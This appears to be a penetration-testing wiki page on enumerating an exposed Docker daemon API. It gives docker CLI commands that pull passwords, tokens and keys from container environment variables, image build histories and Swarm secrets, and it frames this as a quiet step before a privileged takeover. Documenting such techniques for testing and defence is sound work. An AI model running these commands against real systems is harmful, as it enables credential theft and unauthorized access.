---
title: "API enumeration: mapping the environment through the daemon"
description: "Once the Docker API is reachable, its read endpoints map the whole environment before any container is launched: running and stopped containers, their environment variables and labels, images and their histories, networks, volumes, and swarm secrets. This enumeration frequently yields credentials and a quieter path than spawning a new container."
keywords:
  - docker api
  - enumeration
  - docker inspect
  - swarm secrets
  - environment variables
---

# API enumeration

A reachable Docker API is not only a launch point; its read endpoints expose the entire environment. Enumerating first is quieter than immediately spawning a privileged container and often faster, because running containers already hold the secrets worth having. Every call below is a plain `GET` that works over an open 2375 or an authenticated 2376.

```bash
H=tcp://<target>:2375
# Containers, including environment variables and mounts via inspect
docker -H $H ps -a
docker -H $H inspect $(docker -H $H ps -aq) | \
  grep -iE '"Env"|PASSWORD|SECRET|TOKEN|KEY' 
# Images and their build history (secrets baked into layers show here)
docker -H $H images
docker -H $H history --no-trunc <image>
# Networks and volumes (volumes often hold data directories and credentials)
docker -H $H network ls; docker -H $H volume ls
```

## Swarm secrets and configs

If the daemon is a Swarm manager, the API exposes secret and config objects and the services that use them:

```bash
docker -H $H node ls                               # "Is Manager: true" => secrets reachable
docker -H $H secret ls; docker -H $H config ls
# Secrets are not returned by the API directly, but a service can mount them;
# inspect services to see which secrets map where, then read them from a task
docker -H $H service inspect $(docker -H $H service ls -q) | grep -iA3 Secrets
```

Swarm secrets are delivered into service tasks at `/run/secrets/<name>`, so launching or exec-ing into a task that already mounts a secret reveals it.

## Exploitation notes

- `inspect` on running containers is the richest single source: environment variables routinely carry database passwords, cloud keys, and API tokens injected at deploy time.
- Image `history --no-trunc` reveals secrets added in `RUN`/`ENV` layers even if later removed from the filesystem; see [Secrets in image layers](../images-and-registries/secrets-in-image-layers.md).
- Enumeration is read-only and low-noise; use it to decide whether an existing container already gives what you need before launching a privileged one via [Host takeover via privileged run](host-takeover-via-privileged-run.md).

## References

- [Docker Engine API reference](https://docs.docker.com/reference/api/engine/)
- [Docker: manage swarm secrets](https://docs.docker.com/engine/swarm/secrets/)
- [HackTricks: Docker enumeration](https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker)
